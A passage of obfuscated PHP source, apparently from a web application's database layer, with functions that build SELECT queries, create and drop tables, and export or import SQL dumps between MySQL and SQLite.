$this->parseBind(!empty($ŒÕŒ¢œä[$©†ğ˜´Œ[285]]) ? $ŒÕŒ¢œä[$©†ğ˜´Œ[285]] : array())); if ($ğá×å€÷ && !1 !== $ĞÜ‡úòì) { think_cache($¼ë³¡•±, $ĞÜ‡úòì, $ğá×å€÷); } return $ĞÜ‡úòì; } public function buildSelectSql($ÚÎûÂó = array()) { $¸é©†· =& $_SERVER[ÏéâËõ‘]; if (isset($ÚÎûÂó[$¸é©†·[353]])) { if (strpos($ÚÎûÂó[$¸é©†·[353]], $¸é©†·[50])) { list($éÃ³Õ¡, $Ü¥àÈ±‚) = explode($¸é©†·[50], $ÚÎûÂó[$¸é©†·[353]]); } else { $éÃ³Õ¡ = $ÚÎûÂó[$¸é©†·[353]]; } $éÃ³Õ¡ = $éÃ³Õ¡ ? $éÃ³Õ¡ : 1; $Ü¥àÈ±‚ = isset($Ü¥àÈ±‚) ? $Ü¥àÈ±‚ : (is_numeric($ÚÎûÂó[$¸é©†·[292]]) ? $ÚÎûÂó[$¸é©†·[292]] : 20); $Şößğ„¦ = $Ü¥àÈ±‚ * ((int) $éÃ³Õ¡ - 1); $ÚÎûÂó[$¸é©†·[292]] = $Şößğ„¦ . $¸é©†·[50] . $Ü¥àÈ±‚; } if (think_config($¸é©†·[1049])) { $Á‰ş˜ş¾ = $¸é©†·[1050] . md5(serialize($ÚÎûÂó)); $‚˜¿€ş§ = think_cache($Á‰ş˜ş¾); if ($‚˜¿€ş§) { return $‚˜¿€ş§; } } $ÊĞõÌì‚ = $this->parseSql($this->selectSql, $ÚÎûÂó); $ÊĞõÌì‚ .= $this->parseLock(isset($ÚÎûÂó[$¸é©†·[845]]) ? $ÚÎûÂó[$¸é©†·[845]] : !1); if (isset($Á‰ş˜ş¾)) { think_cache($Á‰ş˜ş¾, $ÊĞõÌì‚); } return $ÊĞõÌì‚; } public function parseSql($—ºíóÁ, $üˆ‘•¢‰ = array()) { $éÙÆñ‰ä =& $_SERVER[ÏéâËõ‘]; $—ºíóÁ = str_replace(array($éÙÆñ‰ä[1051], $éÙÆñ‰ä[1052], $éÙÆñ‰ä[1053], $éÙÆñ‰ä[1054], $éÙÆñ‰ä[1055], $éÙÆñ‰ä[1056], $éÙÆñ‰ä[1057], $éÙÆñ‰ä[1058], $éÙÆñ‰ä[1059], $éÙÆñ‰ä[1060], $éÙÆñ‰ä[1061]), array($this->parseTable("{$üˆ‘•¢‰[$éÙÆñ‰ä[279]]}"), $this->parseDistinct(isset($üˆ‘•¢‰[$éÙÆñ‰ä[1062]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[1062]] : !1), $this->parseField(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[273]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[273]] : $éÙÆñ‰ä[188]), $this->parseJoin(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[282]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[282]] : $éÙÆñ‰ä[12]), $this->parseWhere(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[275]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[275]] : $éÙÆñ‰ä[12]), $this->parseGroup(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[515]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[515]] : $éÙÆñ‰ä[12]), $this->parseHaving(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[1063]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[1063]] : $éÙÆñ‰ä[12]), $this->parseOrder(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[365]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[365]] : $éÙÆñ‰ä[12]), $this->parseLimit(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[292]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[292]] : $éÙÆñ‰ä[12]), $this->parseUnion(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[347]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[347]] : $éÙÆñ‰ä[12]), $this->parseComment(!empty($üˆ‘•¢‰[$éÙÆñ‰ä[354]]) ? $üˆ‘•¢‰[$éÙÆñ‰ä[354]] : $éÙÆñ‰ä[12])), $—ºíóÁ); return $—ºíóÁ; } public function getLastSql($Œ“³“¯Œ = '') { return $Œ“³“¯Œ ? $this->modelSql[$Œ“³“¯Œ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($’Ä¾ìªì) { return addslashes($’Ä¾ìªì); } public function setModel($Ì§ß½ßî) { $this->model = $Ì§ß½ßî; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ñé¾–²’ = array()) { $««©Š¶Ì =& $_SERVER[ÏéâËõ‘]; if (empty($Ñé¾–²’)) { $Ñé¾–²’ = $GLOBALS[$««©Š¶Ì[6]][$««©Š¶Ì[21]]; } $this->database = $Ñé¾–²’; } public function model($éÇçš¸¹ = '') { return new ModelBase($éÇçš¸¹, $_SERVER[ÏéâËõ‘][12], $this->database); } public function db($Ù­¶ß± = false) { $Ô¨ñ™İ„ =& $_SERVER[ÏéâËõ‘]; $¤¬ŞØ¾Ğ = array_change_key_case($this->database); if ($this->dbType() == $Ô¨ñ™İ„[13] || !$Ù­¶ß±) { return $this->model()->db(); } $¬Ä¯×¼² = $¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[977]]; $¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[977]] = $Ô¨ñ™İ„[12]; if ($¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[972]] == $Ô¨ñ™İ„[969]) { $’¥öä“Í = $¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[978]]; $¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[978]] = substr($’¥öä“Í, 0, strrpos($’¥öä“Í, $Ô¨ñ™İ„[1064])); } $this->database = $¤¬ŞØ¾Ğ; $ÃÑèòÊ = $this->model()->db(); try { $ãØë‘¾¨ = $ÃÑèòÊ->execute("\163\150\157\x77\x20\x64\141\164\141\142\141\163\145\x73\x20\x6c\x69\x6b\145\40\x27{$¬Ä¯×¼²}\x27"); } catch (Exception $¤÷¤‹…) { } if (!$ãØë‘¾¨) { $ÃÑèòÊ->execute("\143\x72\145\x61\164\x65\x20\x64\x61\164\141\142\x61\x73\x65\40\140{$¬Ä¯×¼²}\140"); } $¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[977]] = $¬Ä¯×¼²; if ($¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[972]] == $Ô¨ñ™İ„[969]) { $¤¬ŞØ¾Ğ[$Ô¨ñ™İ„[978]] .= $Ô¨ñ™İ„[1064] . $¬Ä¯×¼²; } $this->database = $¤¬ŞØ¾Ğ; $ÃÑèòÊ->execute("\x75\163\145\40\x60{$¬Ä¯×¼²}\140"); return $ÃÑèòÊ; } public function createTable($ÌìÓúê±, &$êéá¾Îç) { $ºâÉŒÆŸ =& $_SERVER[ÏéâËõ‘]; if (!IO::exist($ÌìÓúê±)) { ActionCall($ºâÉŒÆŸ[1065], !0, 0); show_json(LNG($ºâÉŒÆŸ[1066]), !1); } $ ŞÇ³Õ‡ = $this->model()->db(); $Ë˜Şèœğ = sqlSplit(IO::getContent($ÌìÓúê±)); foreach ($Ë˜Şèœğ as $îØ¾øá) { $¯ºİñ· = stripos($îØ¾øá, $ºâÉŒÆŸ[1067]) === 0; if ($¯ºİñ·) { $êéá¾Îç->task[$ºâÉŒÆŸ[788]] += 1; } $ ŞÇ³Õ‡->execute($îØ¾øá); if ($¯ºİñ·) { preg_match($ºâÉŒÆŸ[1068], $îØ¾øá, $‡·ú¼Òº); $êéá¾Îç->task[$ºâÉŒÆŸ[1069]] = $‡·ú¼Òº[1]; $êéá¾Îç->update(1); } } } public function insertTable($­ù·£×˜, &$»Ãù­şŒ) { $Ğ€¯‘û‰ =& $_SERVER[ÏéâËõ‘]; $˜°ÚïˆŒ = $this->model()->db(); $º¦¯»¹¦ = $¯‚•ùĞ‚ ? array($¯‚•ùĞ‚) : $˜°ÚïˆŒ->getTables(); foreach ($­ù·£×˜ as $¼úÁ›¡è) { $¯‚•ùĞ‚ = basename($¼úÁ›¡è, $Ğ€¯‘û‰[790]); if (!in_array($¯‚•ùĞ‚, $º¦¯»¹¦)) { continue; } $»Ãù­şŒ->task[$Ğ€¯‘û‰[1069]] = $¯‚•ùĞ‚; if (get_filesize($¼úÁ›¡è) == 0) { continue; } $¥‚×ù = $this->sqlToDb($¼úÁ›¡è, $»Ãù­şŒ); if (!$¥‚×ù) { ActionCall($Ğ€¯‘û‰[1065], !0, 0); show_json(LNG($Ğ€¯‘û‰[1070]) . "\x5b{$¯‚•ùĞ‚}\x5d", !1); } } } public function sqlFromDb($¾•ÚùÖ…, $ƒŸóİˆó, &$åóÃ–¥Î, $ıŠÛô¹Ç = '') { if ($åóÃ–¥Î) { $åóÃ–¥Î->task[$_SERVER[ÏéâËõ‘][1069]] = $¾•ÚùÖ…; } $åİªƒ¬Ğ = $this->model($¾•ÚùÖ…); $î¹º¬Æ  = 0; $Ê²ÓÀ«ì = 0; $äŞèÏ³¹ = 10000; $÷š±æÜ© = fopen($ƒŸóİˆó, $_SERVER[ÏéâËõ‘][1071]); $•¨ ºÚâ = $åİªƒ¬Ğ->getPk(); $úÁ±ø×– = $åİªƒ¬Ğ->getDbFields(); $«»»¿ÍÚ = $_SERVER[ÏéâËõ‘][12]; if ($GLOBALS[$_SERVER[ÏéâËõ‘][789]] && in_array($¾•ÚùÖ…, array($_SERVER[ÏéâËõ‘][1072], $_SERVER[ÏéâËõ‘][1073]))) { $«»»¿ÍÚ = $¾•ÚùÖ…; } do { $ÒÏûâ¸¶ = array($•¨ ºÚâ => array($_SERVER[ÏéâËõ‘][1019], $Ê²ÓÀ«ì)); $œë£ØËŞ = $åİªƒ¬Ğ->where($ÒÏûâ¸¶)->field($úÁ±ø×–)->order($•¨ ºÚâ . $_SERVER[ÏéâËõ‘][1074])->limit($äŞèÏ³¹)->select(); $œë£ØËŞ = !empty($œë£ØËŞ) ? $œë£ØËŞ : array(); if (!($ ˆÑíıé = count($œë£ØËŞ))) { break; } $à¢ûÉï¼ = end($œë£ØËŞ); $Ê²ÓÀ«ì = $à¢ûÉï¼[$•¨ ºÚâ]; $öŞ±Ûç = array(); foreach ($œë£ØËŞ as $Î±‰åß) { if ($«»»¿ÍÚ) { if ($¾•ÚùÖ… == $_SERVER[ÏéâËõ‘][1072]) { if ($Î±‰åß[$_SERVER[ÏéâËõ‘][33]] == $_SERVER[ÏéâËõ‘][1075]) { $ûØ‚Æ° = json_decode($Î±‰åß[$_SERVER[ÏéâËõ‘][374]], !0); if ($ûØ‚Æ°[$_SERVER[ÏéâËõ‘][32]] == $GLOBALS[$_SERVER[ÏéâËõ‘][789]] && $ûØ‚Æ°[$_SERVER[ÏéâËõ‘][752]] != 1) { continue; } } } else { if ($Î±‰åß[$_SERVER[ÏéâËõ‘][33]] == $_SERVER[ÏéâËõ‘][1076] && $Î±‰åß[$_SERVER[ÏéâËõ‘][94]] == $_SERVER[ÏéâËõ‘][781]) { continue; } } } if ($ıŠÛô¹Ç) { $Î±‰åß[$_SERVER[ÏéâËõ‘][84]] = "\x7b\x69\157\x3a{$ıŠÛô¹Ç}\x7d" . substr($Î±‰åß[$_SERVER[ÏéâËõ‘][84]], strlen("\x7b\x69\x6f\72{$Î±‰åß[$_SERVER[ÏéâËõ‘][819]]}\175")); $Î±‰åß[$_SERVER[ÏéâËõ‘][819]] = $ıŠÛô¹Ç; } $öŞ±Ûç[] = $_SERVER[ÏéâËõ‘][1077] . $this->sqlEncode($Î±‰åß) . $_SERVER[ÏéâËõ‘][1078]; } $†õˆÆà = "\x49\x4e\123\105\122\x54\x20\111\x4e\x54\x4f\40\140{$¾•ÚùÖ…}\140\x20\x28\x60" . implode($_SERVER[ÏéâËõ‘][1079], $úÁ±ø×–) . $_SERVER[ÏéâËõ‘][1080]; fwrite($÷š±æÜ©, $†õˆÆà . implode($_SERVER[ÏéâËõ‘][1081], $öŞ±Ûç) . $_SERVER[ÏéâËõ‘][71] . PHP_EOL); $î¹º¬Æ  += $ ˆÑíıé; if ($åóÃ–¥Î) { $åóÃ–¥Î->update($ ˆÑíıé); } } while ($äŞèÏ³¹ == $ ˆÑíıé); fclose($÷š±æÜ©); return $î¹º¬Æ ; } public function sqlToDb($éŞëìŒé, &$œçªÒ³ù) { $Êß¶¨—’ =& $_SERVER[ÏéâËõ‘]; $é÷Ô‹£¾ = $this->model()->db(); $Ìş£óó— = @fopen($éŞëìŒé, $Êß¶¨—’[1082]); if (!$Ìş£óó—) { return !1; } $ØµûÖî° = 0; $û•ù˜Æƒ = $Êß¶¨—’[12]; $³˜ÒŞõ = array(); $é¶Şà£± = $this->dbType(); $¼ªş•ˆç = $é¶Şà£± == $Êß¶¨—’[13] ? 500 : 2000; $”Ç¡á = basename($éŞëìŒé, $Êß¶¨—’[790]); $“óí—²Û = 0; $İğ¬á± = 4194304 - 104858; $¿ÅòÉ÷Ì = 1000000 - 104858; while (!feof($Ìş£óó—)) { $å¬ÒÂÉ = trim(fgets($Ìş£óó—)); if (!$å¬ÒÂÉ) { continue; } $Ç‹¯„ÏÜ = $this->sqlDecode($å¬ÒÂÉ, $é¶Şà£±, $”Ç¡á); if (stripos($Ç‹¯„ÏÜ, $Êß¶¨—’[355]) === 0) { if (!$û•ù˜Æƒ) { $û•ù˜Æƒ = $Ç‹¯„ÏÜ . $Êß¶¨—’[53]; } continue; } if ($œçªÒ³ù) { $œçªÒ³ù->task[$Êß¶¨—’[788]] += 1; } $ØµûÖî°++; $³˜ÒŞõ[] = rtrim(rtrim(trim($Ç‹¯„ÏÜ), $Êß¶¨—’[50]), $Êß¶¨—’[71]); $§‡¡“æ¾ = null; $µÉœîüß = strlen($Ç‹¯„ÏÜ); $“óí—²Û += $µÉœîüß; if ($“óí—²Û >= ($¼ªş•ˆç == 500 ? $¿ÅòÉ÷Ì : $İğ¬á±)) { $§‡¡“æ¾ = array_pop($³˜ÒŞõ); if ($ØµûÖî° > 1) { $ØµûÖî°--; } } if ($ØµûÖî° >= $¼ªş•ˆç || $§‡¡“æ¾) { $Ç‹¯„ÏÜ = $û•ù˜Æƒ . implode($Êß¶¨—’[50], $³˜ÒŞõ); if (!$é÷Ô‹£¾->execute($Ç‹¯„ÏÜ)) { return !1; } if ($œçªÒ³ù) { $œçªÒ³ù->update($ØµûÖî°); } $³˜ÒŞõ = array(); $ØµûÖî° = 0; $“óí—²Û = 0; if ($§‡¡“æ¾) { $³˜ÒŞõ = array($§‡¡“æ¾); $ØµûÖî° = 1; $“óí—²Û = $µÉœîüß; } } } fclose($Ìş£óó—); if (!empty($³˜ÒŞõ)) { $Ç‹¯„ÏÜ = $û•ù˜Æƒ . implode($Êß¶¨—’[50], $³˜ÒŞõ); if (!$é÷Ô‹£¾->execute($Ç‹¯„ÏÜ)) { return !1; } if ($œçªÒ³ù) { $œçªÒ³ù->update($ØµûÖî°); } } return !0; } public function dropTable($ïëÇ“’¼ = null) { $®øˆõÑ¥ = $this->model()->db(); $ë‹ÈüÙÑ = $ïëÇ“’¼ ? array($ïëÇ“’¼) : $®øˆõÑ¥->getTables(); if (!$ë‹ÈüÙÑ) { return; } foreach ($ë‹ÈüÙÑ as $ïëÇ“’¼) { if ($ïëÇ“’¼) { $ïëÇ“’¼ = strtolower($ïëÇ“’¼); } else { continue; } $®øˆõÑ¥->execute("\144\x72\157\160\x20\x74\141\x62\x6c\145\40\151\146\x20\x65\x78\151\x73\164\163\40\140{$ïëÇ“’¼}\140"); } } private function sqlEncode($ãü¥ù‘›) { $ØŞ·¦çğ =& $_SERVER[ÏéâËõ‘]; $³×‰ûáµ = array(); foreach ($ãü¥ù‘› as $Ë¥“¬Åì) { if (is_array($Ë¥“¬Åì)) { $Ë¥“¬Åì = json_encode_force($Ë¥“¬Åì); } $Ë¥“¬Åì = addslashes($Ë¥“¬Åì); $Ë¥“¬Åì = str_replace(array($ØŞ·¦çğ[1083], $ØŞ·¦çğ[231]), array($ØŞ·¦çğ[1084], $ØŞ·¦çğ[1085]), $Ë¥“¬Åì); $³×‰ûáµ[] = str_replace($ØŞ·¦çğ[58], $ØŞ·¦çğ[1086], $Ë¥“¬Åì); } return $ØŞ·¦çğ[58] . implode($ØŞ·¦çğ[1087], $³×‰ûáµ) . $ØŞ·¦çğ[58]; } private function sqlDecode($í§‘Ü‡‰, $³Éòì¡Ñ, $œªš¥Û« = '') { $Â¹À±Ï¼ =& $_SERVER[ÏéâËõ‘]; $í§‘Ü‡‰ = str_replace(array($Â¹À±Ï¼[1084], $Â¹À±Ï¼[1085]), array($Â¹À±Ï¼[1083], $Â¹À±Ï¼[231]), $í§‘Ü‡‰); if ($³Éòì¡Ñ == $Â¹À±Ï¼[13]) { return $œªš¥Û« != $Â¹À±Ï¼[1088] ? stripslashes($í§‘Ü‡‰) : $í§‘Ü‡‰; } if ($œªš¥Û« == $Â¹À±Ï¼[1088]) { $í§‘Ü‡‰ = str_replace($Â¹À±Ï¼[1089], $Â¹À±Ï¼[118], stripslashes($í§‘Ü‡‰)); } return $í§‘Ü‡‰; } public function getSqlFile($˜ä§åÏ› = '') { $‡»øßÙı =& $_SERVER[ÏéâËõ‘]; $ªôšõ’‡ = $this->dbType(!0); $±Çª‹ = CONTROLLER_DIR . "\151\x6e\163\x74\x61\x6c\154\x2f\144\141\164\x61\57{$ªôšõ’‡}\56\x73\x71\154"; $ƒéÂëµ… = file_get_contents($±Çª‹); $ñ°„ÈÚ· = $‡»øßÙı[1090] . ($ªôšõ’‡ == $‡»øßÙı[806] ? $‡»øßÙı[1091] : $‡»øßÙı[1092]) . $‡»øßÙı[1093]; preg_match_all($ñ°„ÈÚ·, $ƒéÂëµ…, $“Œ‹¥şó); $Ø°±Ø…ö = $“Œ‹¥şó[1]; $ÑÎ¦ì¾† = $this->model()->db(); $ ¬™ï’Û = $ÑÎ¦ì¾†->getTables(); $ôøÙÀ†Ä = TEMP_FILES . $‡»øßÙı[1094] . date($‡»øßÙı[753]) . $‡»øßÙı[8]; del_dir($ôøÙÀ†Ä); mk_dir($ôøÙÀ†Ä); $‘¯˜Á¢ = $ôøÙÀ†Ä . $‡»øßÙı[1095]; $Á÷÷Œ‰ = $ôøÙÀ†Ä . $‡»øßÙı[1096]; $‡¨ş÷„ã = $ªôšõ’‡ == $‡»øßÙı[13] ? $‡»øßÙı[806] : $‡»øßÙı[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\x61\x6c\154\57\x64\141\x74\141\57{$‡¨ş÷„ã}\56\x73\161\154", $ôøÙÀ†Ä); @touch($ôøÙÀ†Ä . $ªôšõ’‡ . $‡»øßÙı[790]); $•“„Ú¥ = fopen($‘¯˜Á¢, $‡»øßÙı[1071]); $øü ÒÔ„ = fopen($Á÷÷Œ‰, $‡»øßÙı[1071]); if ($ªôšõ’‡ == $‡»øßÙı[13]) { $ ¬™ï’Û = array_diff($ ¬™ï’Û, array($‡»øßÙı[786], $‡»øßÙı[787])); $Á›û–øï = array($‡»øßÙı[1097], $‡»øßÙı[1098], $‡»øßÙı[1099]); fwrite($øü ÒÔ„, implode(PHP_EOL, $Á›û–øï) . PHP_EOL . PHP_EOL); foreach ($ ¬™ï’Û as $¹Û…ŠŸ) { $ºÈ³Ã¼ó = $this->sqlFromSqlite($¹Û…ŠŸ); if (!$ºÈ³Ã¼ó[$‡»øßÙı[13]]) { continue; } fwrite($øü ÒÔ„, $ºÈ³Ã¼ó[$‡»øßÙı[13]] . PHP_EOL . PHP_EOL); if (!in_array($¹Û…ŠŸ, $Ø°±Ø…ö)) { fwrite($•“„Ú¥, $ºÈ³Ã¼ó[$‡»øßÙı[806]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ ¬™ï’Û as $¹Û…ŠŸ) { $ºÈ³Ã¼ó = $this->sqlFromMysql($¹Û…ŠŸ); if (!$ºÈ³Ã¼ó[$‡»øßÙı[806]]) { continue; } fwrite($•“„Ú¥, $ºÈ³Ã¼ó[$‡»øßÙı[806]] . PHP_EOL . PHP_EOL); if (!in_array($¹Û…ŠŸ, $Ø°±Ø…ö)) { fwrite($øü ÒÔ„, $ºÈ³Ã¼ó[$‡»øßÙı[13]] . PHP_EOL . PHP_EOL); } } } fclose($•“„Ú¥); fclose($øü ÒÔ„); $ƒéÂëµ… = array($‡»øßÙı[806] => $‘¯˜Á¢, $‡»øßÙı[13] => $Á÷÷Œ‰); return $˜ä§åÏ› ? $ƒéÂëµ…[$˜ä§åÏ›] : $ƒéÂëµ…; } public function dbType($Ô¿®ó¢ = false) { $Ïì’µ¼ =& $_SERVER[ÏéâËõ‘]; $½Çô•ş· = $Ô¿®ó¢ ? $GLOBALS[$Ïì’µ¼[6]][$Ïì’µ¼[21]] : $this->database; $½Çô•ş· = array_change_key_case($½Çô•ş·); $éÈÊ“‰ = $½Çô•ş·[$Ïì’µ¼[972]]; if ($éÈÊ“‰ == $Ïì’µ¼[969]) { $ôÌõÙ¹ì = explode($Ïì’µ¼[4], $½Çô•ş·[$Ïì’µ¼[978]]); $éÈÊ“‰ = $ôÌõÙ¹ì[0]; } $§Œéíµ‹ = array($Ïì’µ¼[1100] => $Ïì’µ¼[13], $Ïì’µ¼[917] => $Ïì’µ¼[806]); if (isset($§Œéíµ‹[$éÈÊ“‰])) { $éÈÊ“‰ = $§Œéíµ‹[$éÈÊ“‰]; } return $éÈÊ“‰; } public function sqlFromMysql($ŸÆ‘«ÙÎ, $‚“¹©ª© = '') { $èÎÇÎ×ò =& $_SERVER[ÏéâËõ‘]; $“£Ãªüã = $this->model()->db(); $¶íİâó = $“£Ãªüã->query($èÎÇÎ×ò[1101] . $ŸÆ‘«ÙÎ . $èÎÇÎ×ò[385]); if (!$¶íİâó || !$¶íİâó[0]) { return !1; } $Şã¹©¤” = _get($¶íİâó[0], $èÎÇÎ×ò[1102], $èÎÇÎ×ò[12]); if (!$Şã¹©¤”) { return !1; } $î„’¡« = "\x44\x52\117\x50\40\124\101\x42\x4c\105\40\111\106\x20\105\130\x49\x53\x54\x53\40\x60{$ŸÆ‘«ÙÎ}\140\73" . PHP_EOL . $Şã¹©¤” . $èÎÇÎ×ò[71]; if ($‚“¹©ª© && $‚“¹©ª© == $èÎÇÎ×ò[806]) { return $î„’¡«; } $¡–ŸŒ½ı = array_change_key_case($GLOBALS[$èÎÇÎ×ò[6]][$èÎÇÎ×ò[21]]); $•È‹Ó„ = $¡–ŸŒ½ı[$èÎÇÎ×ò[977]]; $ÛŠÈñšÏ = $èÎÇÎ×ò[1103] . $•È‹Ó„ . $èÎÇÎ×ò[1104] . $ŸÆ‘«ÙÎ . $èÎÇÎ×ò[58]; $œé‚Øù¥ = $èÎÇÎ×ò[1105] . $ŸÆ‘«ÙÎ . $èÎÇÎ×ò[905]; $ëÙ²‡¦Ó = $“£Ãªüã->query($ÛŠÈñšÏ); if (empty($ëÙ²‡¦Ó)) { $¶é•† = array($èÎÇÎ×ò[806] => $èÎÇÎ×ò[12], $èÎÇÎ×ò[13] => $èÎÇÎ×ò[12]); return $‚“¹©ª© ? $¶é•†[$‚“¹©ª©] : $¶é•†; } $®²·ñÎĞ = $“£Ãªüã->query($œé‚Øù¥); $ÊòÈëÁº = $èÎÇÎ×ò[12]; $æê˜¸Óˆ = array(); foreach ($®²·ñÎĞ as $ÛÚÖƒ) { if (!$ÊòÈëÁº && $ÛÚÖƒ[$èÎÇÎ×ò[1106]] == $èÎÇÎ×ò[1107]) { $ÊòÈëÁº = $ÛÚÖƒ[$èÎÇÎ×ò[1108]]; } if (isset($æê˜¸Óˆ[$ÛÚÖƒ[$èÎÇÎ×ò[1106]]])) { $æê˜¸Óˆ[$ÛÚÖƒ[$èÎÇÎ×ò[1106]]][$èÎÇÎ×ò[1109]][] = $ÛÚÖƒ[$èÎÇÎ×ò[1108]]; continue; } $æê˜¸Óˆ[$ÛÚÖƒ[$èÎÇÎ×ò[1106]]] = array($èÎÇÎ×ò[1110] => $ÛÚÖƒ[$èÎÇÎ×ò[1106]], $èÎÇÎ×ò[1109] => array($ÛÚÖƒ[$èÎÇÎ×ò[1108]]), $èÎÇÎ×ò[1111] => $ÛÚÖƒ[$èÎÇÎ×ò[1112]] == $èÎÇÎ×ò[88] ? 0 : 1); } $—Ë–ñ§Ø = array(); foreach ($æê˜¸Óˆ as $ÛÚÖƒ) { $¸“²¤ñÈ = $ÛÚÖƒ[$èÎÇÎ×ò[1110]] == $èÎÇÎ×ò[1107]; $çÇÙ¸Ô­ = array($èÎÇÎ×ò[1113], $ÛÚÖƒ[$èÎÇÎ×ò[1111]] == $èÎÇÎ×ò[88] && !$¸“²¤ñÈ ? $èÎÇÎ×ò[1114] : $èÎÇÎ×ò[12], $èÎÇÎ×ò[1115], $èÎÇÎ×ò[1116] . $ŸÆ‘«ÙÎ . $èÎÇÎ×ò[11] . ($¸“²¤ñÈ ? $èÎÇÎ×ò[1117] : $ÛÚÖƒ[$èÎÇÎ×ò[1110]]) . $èÎÇÎ×ò[118], $èÎÇÎ×ò[1118], $èÎÇÎ×ò[118] . $ŸÆ‘«ÙÎ . $èÎÇÎ×ò[118], $èÎÇÎ×ò[1119] . implode($èÎÇÎ×ò[1120], $ÛÚÖƒ[$èÎÇÎ×ò[1109]]) . $èÎÇÎ×ò[1121]); $—Ë–ñ§Ø[] = implode($èÎÇÎ×ò[53], $çÇÙ¸Ô­) . $èÎÇÎ×ò[71]; } $©ºéÂ¨í = array(); $ÅíÉó¹¥ = array($èÎÇÎ×ò[1122] => $èÎÇÎ×ò[1123], $èÎÇÎ×ò[1123] => $èÎÇÎ×ò[1123], $èÎÇÎ×ò[288] => $èÎÇÎ×ò[315], $èÎÇÎ×ò[287] => $èÎÇÎ×ò[315]); foreach ($ëÙ²‡¦Ó as $ÛÚÖƒ) { $çÇÙ¸Ô­ = array($èÎÇÎ×ò[118] . $ÛÚÖƒ[$èÎÇÎ×ò[1124]] . $èÎÇÎ×ò[118], isset($ÅíÉó¹¥[$ÛÚÖƒ[$èÎÇÎ×ò[1125]]]) ? $ÅíÉó¹¥[$ÛÚÖƒ[$èÎÇÎ×ò[1125]]] : $ÛÚÖƒ[$èÎÇÎ×ò[1126]], $ÛÚÖƒ[$èÎÇÎ×ò[1127]] == $èÎÇÎ×ò[903] ? $èÎÇÎ×ò[1128] : $èÎÇÎ×ò[1129], $ÛÚÖƒ[$èÎÇÎ×ò[1124]] == $ÊòÈëÁº ? $èÎÇÎ×ò[1130] : $èÎÇÎ×ò[12], $ÛÚÖƒ[$èÎÇÎ×ò[954]] ? strtoupper(str_replace($èÎÇÎ×ò[11], $èÎÇÎ×ò[12], $ÛÚÖƒ[$èÎÇÎ×ò[954]])) : $èÎÇÎ×ò[12]); $©ºéÂ¨í[] = trim(implode($èÎÇÎ×ò[53], $çÇÙ¸Ô­)); } $½¨Ë˜Ï‰ = array($èÎÇÎ×ò[1131] . $ŸÆ‘«ÙÎ . $èÎÇÎ×ò[1132], $èÎÇÎ×ò[1133] . $ŸÆ‘«ÙÎ . $èÎÇÎ×ò[1134], implode($èÎÇÎ×ò[50] . PHP_EOL, $©ºéÂ¨í), $èÎÇÎ×ò[951]); $óğ¦­ñ  = implode(PHP_EOL, array_merge($½¨Ë˜Ï‰, $—Ë–ñ§Ø)); if ($‚“¹©ª© && $‚“¹©ª© == $èÎÇÎ×ò[13]) { return $óğ¦­ñ ; } $¶é•† = array($èÎÇÎ×ò[806] => $î„’¡«, $èÎÇÎ×ò[13] => $óğ¦­ñ ); return $‚“¹©ª© ? $¶é•†[$‚“¹©ª©] : $¶é•†; } public function sqlFromSqlite($ß§•æ÷, $¢ÒÇ§¿Æ = '') { $º´Õú÷™ =& $_SERVER[ÏéâËõ‘]; $€è’¼÷ = $this->model()->db(); $–Š­¥¨Ø = "\120\122\x41\107\x4d\x41\40\124\x41\102\x4c\105\137\x49\116\x46\117\40\x28\47{$ß§•æ÷}\x27\51"; $ûıŞÆÃî = "\123\x45\x4c\105\x43\124\40\52\40\106\x52\x4f\x4d\x20\x73\x71\154\x69\x74\145\x5f\x6d\x61\163\164\x65\x72\x20\127\x48\105\x52\x45\x20\164\x62\154\137\156\141\155\145\x20\75\x20\x27{$ß§•æ÷}\47"; $ŠÙ¢¼¦Ã = $€è’¼÷->query($–Š­¥¨Ø); if (empty($ŠÙ¢¼¦Ã)) { $û¾õ¦í÷ = array($º´Õú÷™[806] => $º´Õú÷™[12], $º´Õú÷™[13] => $º´Õú÷™[12]); return $¢ÒÇ§¿Æ ? $û¾õ¦í÷[$¢ÒÇ§¿Æ] : $û¾õ¦í÷; } $µĞúÏÈó = $€è’¼÷->query($ûıŞÆÃî); $ÈÇ†ÒÇÙ = $ÜÊ£ = array(); foreach ($µĞúÏÈó as $¬ç­™«) { if ($¬ç­™«[$º´Õú÷™[33]] == $º´Õú÷™[279]) { $ÈÇ†ÒÇÙ[] = $¬ç­™«[$º´Õú÷™[1135]]; } else { $ÜÊ£[$¬ç­™«[$º´Õú÷™[32]]] = $¬ç­™«[$º´Õú÷™[1135]]; } } $áøïÉ = array_merge(array($º´Õú÷™[1131] . $ß§•æ÷ . $º´Õú÷™[118]), $ÈÇ†ÒÇÙ, array_values($ÜÊ£)); $áøïÉ = implode($º´Õú÷™[71] . PHP_EOL, $áøïÉ) . $º´Õú÷™[71]; if ($¢ÒÇ§¿Æ && $¢ÒÇ§¿Æ == $º´Õú÷™[13]) { return $áøïÉ; } $ù‡ª¸ ™ = array(); $ã£¶âˆ• = 